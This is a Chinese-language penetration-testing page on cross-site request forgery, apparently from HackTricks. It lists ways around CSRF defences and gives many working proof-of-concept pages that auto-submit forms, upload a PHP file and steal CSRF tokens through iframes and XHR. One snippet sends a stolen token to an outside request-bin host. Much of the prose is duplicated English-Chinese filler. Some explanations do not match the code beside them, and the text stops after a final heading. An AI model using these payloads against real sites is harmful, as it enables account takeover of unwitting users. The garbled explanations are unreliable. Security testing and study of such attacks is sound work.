# CSRF（跨站请求伪造）

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密漏洞赏金的家园。**

**即时获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞经过验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起的日子里掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并占据每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register)开始从您的黑客行动中获利！

{% embed url="https://hackenproof.com/register" %}

## 什么是CSRF？

**跨站请求伪造**（也称为CSRF）是一种Web安全漏洞，允许攻击者**诱使用户执行他们不打算执行的操作**。\
这是通过使受害者平台上的**已登录用户**访问攻击者控制的网站，并从那里**执行**恶意JS代码、发送表单或检索“图像”到**受害者账户**来实现的。

### 先决条件

要滥用CSRF漏洞，首先需要**找到一个相关的操作来滥用**（更改密码或电子邮件、让受害者在社交网络上关注您、给您更多权限等）。会话必须仅依赖于cookie或HTTP基本身份验证标头，不能使用任何其他标头来处理会话。最后，请求中**不应该有不可预测的参数**。

可以采取多种**对策**来避免此漏洞。

### **常见的防御措施**

* [**SameSite cookies**](hacking-with-cookies/#samesite)：如果会话cookie使用此标志，您可能无法从任意网站发送cookie。
* [**跨源资源共享**](cors-bypass.md)：根据您需要执行的HTTP请求类型，您可能需要考虑受害站点的**CORS策略**。_请注意，CORS策略不会影响您只想从表单发送GET请求或POST请求而不需要读取响应的情况。_
* 要求用户输入**密码**以授权操作。
* 解析**Referrer**或**Origin**标头。如果使用正则表达式，可以通过以下方式绕过：
* http://mal.net?orig=http://example.com（以该URL结尾）
* http://example.com.mal.net（以该URL开头）
* **修改**Post或Get请求的**参数名称**
* 在每个会话中使用**CSRF令牌**。此令牌必须在请求中发送以确认操作。此令牌可以受到CORS的保护。

### CSRF映射

![](<../.gitbook/assets/image (112).png>)

## 防御绕过

### 从POST到GET

也许您想要滥用的表单准备发送**带有CSRF令牌的POST请求**，但是，您应该**检查**是否也可以发送**GET请求**，并且在发送GET请求时**仍然验证CSRF令牌**。

### 缺少令牌

某些应用程序在令牌存在时**正确验证令牌，但如果省略了令牌，则跳过验证**。\
在这种情况下，攻击者可以**删除包含令牌的整个参数**（而不仅仅是其值），以绕过验证并进行CSRF攻击。

### CSRF令牌与用户会话无关

某些应用程序**不验证令牌是否属于发出请求的用户会话**。相反，应用程序维护一个全局令牌池，接受出现在此池中的任何令牌。\
在这种情况下，攻击者可以使用自己的帐户登录应用程序，**获取有效令牌**，然后将该令牌提供给受害者用户进行CSRF攻击。

### 方法绕过

如果请求使用了“**奇怪的**”**方法**，请检查**方法覆盖功能**是否正常工作。\
例如，如果使用了**PUT方法**，您可以尝试使用**POST方法**并发送：_https://example.com/my/dear/api/val/num?**\_method=PUT**_

这也可以通过在POST请求中发送**\_method参数**或使用**标头**来实现：

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### 自定义头部令牌绕过

如果请求中添加了一个带有令牌的自定义头部作为CSRF保护方法，那么：

- 在请求中测试时不带自定义令牌和头部。
- 在请求中测试时使用长度相同但令牌不同的值。

### CSRF令牌由Cookie验证

在前面的漏洞的进一步变种中，一些应用程序会在Cookie和请求参数中**复制每个令牌**。或者在后端**设置一个CSRF Cookie**，并且**检查后端是否与Cookie相关联的CSRF令牌**。

当验证后续请求时，应用程序只需验证**请求参数中提交的令牌是否与Cookie中存储的值匹配**。\
在这种情况下，如果网站中存在任何允许攻击者将其CSRF Cookie设置为受害者的漏洞，攻击者可以再次执行CSRF攻击。

在这种情况下，您可以尝试设置Cookie来加载一个伪造的图像，然后像这个例子一样发起CSRF攻击：
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
请注意，如果**csrf令牌与会话cookie相关联，此攻击将无效**，因为您需要将您的会话设置为受害者，因此您将攻击自己。
{% endhint %}

### 更改Content-Type

根据[**这里**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)，为了**避免预检请求**使用**POST**方法，这些是允许的Content-Type值：

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

然而，请注意，**服务器逻辑可能会有所不同**，取决于使用的Content-Type，因此您应该尝试上述提到的值以及其他值，如**`application/json`**_**,**_**`text/xml`**，**`application/xml`**_._

发送JSON数据作为text/plain的示例（来自[这里](https://brycec.me/posts/corctf\_2021\_challenges)）：
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### application/json预检请求绕过

正如你已经知道的，你不能通过HTML表单发送Content-Type为**`application/json`**的POST请求，如果你尝试通过**`XMLHttpRequest`**这样做，首先会发送一个**预检请求**。\
然而，你可以尝试使用内容类型为**`text/plain`**和**`application/x-www-form-urlencoded`**来发送JSON数据，只是为了检查后端是否独立于Content-Type使用数据。\
你可以使用`Content-Type: text/plain`设置**`enctype="text/plain"`**来发送一个表单。

如果服务器只接受内容类型为"application/json"，你可以发送内容类型为"text/plain; application/json"的请求，而不触发预检请求。

你还可以尝试通过使用**SWF Flash文件**来**绕过**这个限制。更多信息请[**阅读此文章**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)。

### 绕过Referrer / Origin检查

**避免使用Referrer头**

一些应用程序在请求中验证Referer头是否存在，但是**如果省略了该头，则跳过验证**。
```markup
<meta name="referrer" content="never">
```
**正则表达式绕过**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

要在Referrer将发送到参数内的URL中设置服务器的域名，可以执行以下操作：
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD方法绕过**

[**这个CTF解答**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)的第一部分解释了[Oak的源代码](https://github.com/oakserver/oak/blob/main/router.ts#L281)，一个路由器被设置为将**HEAD请求处理为没有响应体的GET请求** - 这是一个常见的解决方法，不仅仅适用于Oak。与处理HEAD请求的特定处理程序不同，它们只是**交给GET处理程序，但应用程序会删除响应体**。

因此，如果GET请求受到限制，您可以**发送一个将被处理为GET请求的HEAD请求**。

## **利用示例**

### **窃取CSRF令牌**

如果使用**CSRF令牌**作为**防御**，您可以尝试通过滥用[XSS](xss-cross-site-scripting/#xss-stealing-csrf-tokens)漏洞或[悬挂标记](dangling-markup-html-scriptless-injection.md)漏洞来**窃取它**。

### **使用HTML标签进行GET请求**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
其他可以用于自动发送GET请求的HTML5标签有：

![](<../.gitbook/assets/image (530).png>)

### 表单GET请求
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### 表单POST请求

A common method for sending data to a server is through a form POST request. This is commonly used in web applications for submitting user input or performing actions on the server.

To send a form POST request, the client (usually a web browser) constructs an HTTP request with the following characteristics:

- The HTTP method is set to POST.
- The target URL is specified in the `action` attribute of the form element.
- The form data is encoded and included in the body of the request.

The server then processes the request and performs the necessary actions based on the submitted data.

### 表单POST请求

向服务器发送数据的常见方法是通过表单POST请求。这在Web应用程序中常用于提交用户输入或在服务器上执行操作。

要发送表单POST请求，客户端（通常是Web浏览器）构造一个具有以下特征的HTTP请求：

- HTTP方法设置为POST。
- 目标URL在表单元素的`action`属性中指定。
- 表单数据被编码并包含在请求的正文中。

然后，服务器处理请求并根据提交的数据执行必要的操作。
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### 通过iframe进行表单POST请求

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a victim into submitting a form without their knowledge or consent. One way to achieve this is by using an iframe.

攻击者可以利用跨站请求伪造（CSRF）漏洞，通过欺骗受害者在不知情或未经同意的情况下提交表单来进行攻击。其中一种方法是使用iframe。

To perform a CSRF attack using an iframe, the attacker creates a webpage that contains a hidden form. This form is then submitted automatically by the victim's browser when they visit the attacker's webpage.

要使用iframe执行CSRF攻击，攻击者创建一个包含隐藏表单的网页。当受害者访问攻击者的网页时，该表单将由受害者的浏览器自动提交。

Here's an example of how the attack works:

以下是攻击的示例：

```html
<html>
  <body>
    <h1>Welcome to my website!</h1>
    <iframe src="https://victim-website.com" style="display:none;"></iframe>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

In this example, the attacker's webpage includes an iframe that loads the victim's website. The iframe is hidden from the user's view using the `display:none;` CSS property. The JavaScript code then automatically submits the first form on the victim's website.

在这个示例中，攻击者的网页包含一个加载受害者网站的iframe。使用`display:none;` CSS属性，将iframe隐藏在用户的视图之外。然后，JavaScript代码自动提交受害者网站上的第一个表单。

When the victim visits the attacker's webpage, their browser will automatically submit the form on the victim's website, potentially causing unintended actions or changes in the victim's account.

当受害者访问攻击者的网页时，他们的浏览器将自动提交受害者网站上的表单，可能导致受害者账户中的意外操作或更改。

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, checking the origin of requests, and implementing strict referer policies.

为了防止CSRF攻击，Web开发人员应采取措施，如使用反CSRF令牌、检查请求的来源和实施严格的引用策略。
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST 请求**

In an Ajax POST request, the browser sends a request to the server to perform an action, such as updating data or submitting a form, without reloading the entire page. This is done using JavaScript and the XMLHttpRequest object.

在 Ajax POST 请求中，浏览器发送一个请求到服务器执行一个动作，比如更新数据或提交一个表单，而不需要重新加载整个页面。这是通过使用 JavaScript 和 XMLHttpRequest 对象来实现的。

To perform a CSRF attack on an Ajax POST request, the attacker needs to trick the victim into making a request to a specific URL with malicious parameters. This can be done by embedding the malicious request in a webpage or by exploiting a vulnerability in a trusted website.

要对 Ajax POST 请求进行 CSRF 攻击，攻击者需要诱使受害者向特定的 URL 发送带有恶意参数的请求。这可以通过将恶意请求嵌入到网页中或利用受信任网站的漏洞来实现。

To protect against CSRF attacks in Ajax POST requests, you can implement the same techniques as in regular form submissions, such as using CSRF tokens or checking the origin of the request.

为了防止 Ajax POST 请求的 CSRF 攻击，可以采用与常规表单提交相同的技术，比如使用 CSRF 令牌或检查请求的来源。

It is important to note that Ajax requests can still be vulnerable to CSRF attacks even if they are made with the POST method, as the attacker can still trick the victim into making the request.

需要注意的是，即使使用 POST 方法进行 Ajax 请求，它们仍然可能容易受到 CSRF 攻击，因为攻击者仍然可以诱使受害者发起请求。

To prevent CSRF attacks in Ajax POST requests, it is recommended to use additional security measures, such as implementing the SameSite attribute for cookies or using anti-CSRF libraries.

为了防止 Ajax POST 请求的 CSRF 攻击，建议采取额外的安全措施，比如为 cookie 实现 SameSite 属性或使用反 CSRF 库。
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST 请求

In a `multipart/form-data` POST request, the data is divided into multiple parts, each with its own content type and boundary. This type of request is commonly used when uploading files or submitting forms with binary data.

在 `multipart/form-data` POST 请求中，数据被分成多个部分，每个部分都有自己的内容类型和边界。这种类型的请求通常用于上传文件或提交包含二进制数据的表单。

To construct a `multipart/form-data` request, you need to set the `Content-Type` header to `multipart/form-data` and include the appropriate boundaries between the parts. Each part should have a `Content-Disposition` header specifying the name and filename (if applicable) of the data.

要构造一个 `multipart/form-data` 请求，你需要将 `Content-Type` 头设置为 `multipart/form-data`，并在各个部分之间包含适当的边界。每个部分应该有一个 `Content-Disposition` 头，指定数据的名称和文件名（如果适用）。

Here is an example of a `multipart/form-data` POST request:

下面是一个 `multipart/form-data` POST 请求的示例：

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="example.txt"
Content-Type: text/plain

This is the content of the file.

-----------------------------1234567890
Content-Disposition: form-data; name="name"

John Doe
-----------------------------1234567890--
```

In this example, the request is sent to `example.com/upload` with two parts. The first part is a file named `example.txt` with the content type `text/plain`. The second part is a form field named `name` with the value `John Doe`. The boundaries (`---------------------------1234567890`) separate the parts of the request.

在这个示例中，请求被发送到 `example.com/upload`，包含两个部分。第一个部分是一个名为 `example.txt` 的文件，内容类型为 `text/plain`。第二个部分是一个名为 `name` 的表单字段，值为 `John Doe`。边界（`---------------------------1234567890`）分隔了请求的各个部分。
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST请求 v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request.

#### Introduction

A multipart/form-data POST request is commonly used to upload files or submit form data that includes binary content. This type of request is typically used when interacting with web applications that have file upload functionality.

#### Exploiting CSRF with multipart/form-data POST request

To exploit CSRF using a multipart/form-data POST request, we need to create a malicious HTML page that will automatically submit the request when loaded by the victim's browser. This can be achieved by embedding a hidden form in the HTML page and using JavaScript to automatically submit the form.

The form should be configured to submit the request to the target application's vulnerable endpoint. The request should include any required parameters, such as the file to be uploaded or form data to be submitted.

When the victim visits the malicious HTML page, the hidden form will be automatically submitted, triggering the CSRF attack. The victim's browser will send the multipart/form-data POST request to the target application, potentially causing unintended actions to occur.

#### Mitigating CSRF attacks with multipart/form-data POST request

To mitigate CSRF attacks using multipart/form-data POST requests, web applications can implement the following measures:

1. Implement CSRF tokens: Web applications can generate and include unique CSRF tokens in each form submission. These tokens should be validated on the server-side to ensure that the request is legitimate.

2. Implement SameSite cookies: Setting the SameSite attribute to "Strict" or "Lax" for cookies can prevent them from being sent in cross-site requests, thereby mitigating CSRF attacks.

3. Implement Referer header validation: Web applications can validate the Referer header of incoming requests to ensure that they originate from the same domain. This can help detect and block CSRF attacks.

By implementing these measures, web applications can significantly reduce the risk of CSRF attacks through multipart/form-data POST requests.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### 在iframe中发送表单POST请求

In some cases, you may encounter a scenario where you need to send a POST request from within an iframe. This can be useful for performing Cross-Site Request Forgery (CSRF) attacks or for other testing purposes.

在某些情况下，您可能会遇到需要在iframe中发送POST请求的情况。这对于执行跨站请求伪造（CSRF）攻击或其他测试目的非常有用。

To achieve this, you can create a hidden form within the iframe and then submit it programmatically using JavaScript. Here's an example of how you can do this:

为了实现这一点，您可以在iframe中创建一个隐藏的表单，然后使用JavaScript以编程方式提交它。以下是您可以执行此操作的示例：

```html
<iframe id="myIframe" src="about:blank"></iframe>

<script>
  // Get a reference to the iframe
  var iframe = document.getElementById('myIframe');

  // Create a hidden form
  var form = document.createElement('form');
  form.style.display = 'none';
  form.method = 'POST';
  form.action = 'https://www.example.com/endpoint';

  // Add any necessary form fields
  var input1 = document.createElement('input');
  input1.type = 'hidden';
  input1.name = 'param1';
  input1.value = 'value1';
  form.appendChild(input1);

  var input2 = document.createElement('input');
  input2.type = 'hidden';
  input2.name = 'param2';
  input2.value = 'value2';
  form.appendChild(input2);

  // Append the form to the iframe's document
  iframe.contentDocument.body.appendChild(form);

  // Submit the form
  form.submit();
</script>
```

This code creates an iframe with the id "myIframe" and sets its source to "about:blank". Then, it programmatically creates a hidden form with the desired method (POST) and action (the target URL). It adds any necessary form fields as hidden inputs and appends the form to the iframe's document. Finally, it submits the form.

此代码创建了一个id为"myIframe"的iframe，并将其源设置为"about:blank"。然后，它以编程方式创建了一个具有所需方法（POST）和操作（目标URL）的隐藏表单。它将任何必要的表单字段作为隐藏输入添加，并将表单附加到iframe的文档中。最后，它提交了表单。

By using this technique, you can send a POST request from within an iframe and perform actions on behalf of the user, potentially leading to CSRF vulnerabilities. It's important to be aware of the security implications and use this technique responsibly and ethically.

通过使用这种技术，您可以在iframe内部发送POST请求，并代表用户执行操作，可能导致CSRF漏洞。重要的是要意识到安全影响，并负责任和道德地使用这种技术。
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **窃取CSRF令牌并发送POST请求**

To perform a CSRF attack, you need to steal the CSRF token from the target website and then use it to craft a malicious POST request. Here's how you can do it:

1. **Stealing the CSRF Token:**
   - If the CSRF token is stored in a cookie, you can use JavaScript to extract it from the cookie and send it to your server. You can achieve this by injecting a malicious script into a vulnerable page or by using a Man-in-the-Middle (MitM) attack to intercept the token.
   - If the CSRF token is embedded in a form or a URL parameter, you can extract it using JavaScript or by analyzing the source code of the target page.

2. **Crafting the Malicious POST Request:**
   - Once you have the CSRF token, you can use it to craft a POST request with the desired payload. Make sure to include the CSRF token in the request headers or body, depending on how the target website expects it.
   - The payload of the POST request can contain any malicious action you want to perform on behalf of the victim user. For example, you can change their password, make a purchase, or perform any other action that the target website allows.

3. **Sending the POST Request:**
   - To send the POST request, you can use various tools like cURL, Python requests library, or browser extensions like Postman or Burp Suite.
   - Make sure to set the appropriate headers and parameters in the request to mimic a legitimate request from the victim user.
   - Once the request is sent, the target website will process it as if it came from the victim user, potentially leading to unauthorized actions or data leakage.

Remember that CSRF attacks can have serious consequences, so always ensure that you have proper authorization before attempting such attacks.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **窃取CSRF令牌并使用iframe、表单和Ajax发送Post请求**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request. This can be achieved using an iframe, a form, or Ajax.

#### **Stealing the CSRF Token**

1. **Using an iframe**: You can create an invisible iframe that loads the target website's page containing the CSRF token. By accessing the iframe's content, you can extract the CSRF token and store it in a variable.

```html
<iframe id="csrfFrame" src="https://target-website.com/page-with-csrf-token"></iframe>
<script>
    var csrfToken = document.getElementById('csrfFrame').contentDocument.getElementById('csrfToken').value;
    // Store the CSRF token in a variable for later use
</script>
```

2. **Using a form**: Another method is to create a hidden form that submits a GET request to the target website's page containing the CSRF token. By parsing the response, you can extract the CSRF token and store it in a variable.

```html
<form id="csrfForm" action="https://target-website.com/page-with-csrf-token" method="GET">
    <input type="hidden" name="csrfToken" value="">
</form>
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://target-website.com/page-with-csrf-token', true);
    xhr.onload = function() {
        var parser = new DOMParser();
        var responseDoc = parser.parseFromString(xhr.responseText, 'text/html');
        var csrfToken = responseDoc.getElementById('csrfToken').value;
        // Store the CSRF token in a variable for later use
    };
    xhr.send();
</script>
```

#### **Sending a POST Request**

Once you have obtained the CSRF token, you can use it to craft a malicious POST request and send it to the target website. This can be done using an iframe, a form, or Ajax.

1. **Using an iframe**: Create a hidden iframe and set its source to the target website's endpoint that accepts the POST request. Include the stolen CSRF token as a parameter in the request.

```html
<iframe id="postFrame" style="display:none;"></iframe>
<script>
    var postFrame = document.getElementById('postFrame');
    postFrame.src = 'https://target-website.com/post-endpoint?csrfToken=' + csrfToken;
</script>
```

2. **Using a form**: Create a hidden form and set its action to the target website's endpoint that accepts the POST request. Include the stolen CSRF token as a hidden input field in the form.

```html
<form id="postForm" action="https://target-website.com/post-endpoint" method="POST">
    <input type="hidden" name="csrfToken" value="csrfToken">
</form>
<script>
    var postForm = document.getElementById('postForm');
    postForm.submit();
</script>
```

3. **Using Ajax**: Use JavaScript to send a POST request to the target website's endpoint. Include the stolen CSRF token as a parameter in the request.

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://target-website.com/post-endpoint', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('csrfToken=' + csrfToken);
</script>
```

By stealing the CSRF token and sending a malicious POST request, you can exploit the vulnerability of the target website and perform unauthorized actions on behalf of the victim user.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **窃取CSRF令牌并使用iframe和表单发送POST请求**

One way to exploit Cross-Site Request Forgery (CSRF) vulnerabilities is by stealing the CSRF token and sending a POST request using an iframe and a form. This technique allows an attacker to trick a victim into unknowingly performing actions on a vulnerable website.

To carry out this attack, the attacker first needs to obtain the CSRF token. This token is typically stored in a cookie or as a hidden field in a form. The attacker can use various methods to steal the token, such as exploiting other vulnerabilities like XSS or by tricking the victim into visiting a malicious website.

Once the CSRF token is obtained, the attacker can create an iframe on their malicious website. The iframe's source will be set to the target website's URL, and the attacker will include a form within the iframe. The form will have the necessary fields to perform the desired action, such as transferring funds or changing account settings.

When the victim visits the attacker's website, the iframe will load the target website in the background. Since the victim is already authenticated on the target website, the browser will include the CSRF token in the request. The form within the iframe will automatically submit the request, effectively performing the action on behalf of the victim.

To prevent this type of attack, websites should implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict SameSite cookie policies. Additionally, users should be cautious when visiting unfamiliar websites and regularly update their browsers and security software to protect against potential vulnerabilities.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **窃取令牌并使用2个iframe发送**

One way to perform a CSRF attack is by stealing the victim's authentication token and sending it using two iframes. This attack can be executed in the following steps:

1. The attacker creates a malicious website that contains two hidden iframes.
2. The first iframe is loaded with the target website's login page.
3. The second iframe is loaded with a page on the attacker's website that contains a form.
4. The form in the second iframe is automatically submitted, targeting a vulnerable endpoint on the target website.
5. The victim visits the attacker's malicious website, which triggers the loading of the iframes.
6. The first iframe loads the target website's login page, tricking the victim into entering their credentials.
7. The second iframe submits the form, including the stolen authentication token, to the vulnerable endpoint on the target website.
8. The vulnerable endpoint processes the request, believing it to be legitimate due to the presence of the valid authentication token.
9. The attacker successfully performs actions on behalf of the victim, using their stolen token.

To prevent this type of attack, web developers should implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict access controls.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **使用Ajax窃取CSRF令牌并通过表单发送POST请求**

In this technique, we will use Ajax to steal the CSRF token from the target website and then send a POST request using a form.

在这个技术中，我们将使用Ajax从目标网站窃取CSRF令牌，然后使用一个表单发送POST请求。

